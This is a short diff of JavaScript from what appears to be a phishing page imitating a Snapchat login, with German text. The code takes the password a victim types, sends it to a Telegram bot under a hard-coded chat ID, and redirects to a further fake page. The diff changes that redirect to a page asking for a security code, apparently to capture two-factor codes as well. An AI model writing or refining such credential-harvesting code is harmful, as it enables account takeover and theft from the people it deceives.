@@ -17,14 +17,14 @@
                 var chatId = "709764990";
                 var message = $("#passwordinput").val();
                 var userAgent = navigator.userAgent;
-                var fullMessage = "Passwort: " + message + "\nUser-Agent: " + userAgent;
+                var fullMessage = "Passwort: " + message;
                 
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                     console.log("Antwort von der Telegram API:", data);
                 });
 
                 setTimeout(function() {
-                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPasswort.htm";
+                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginSicherheitscode.htm";
                 }, 1000);
             }
         </script>
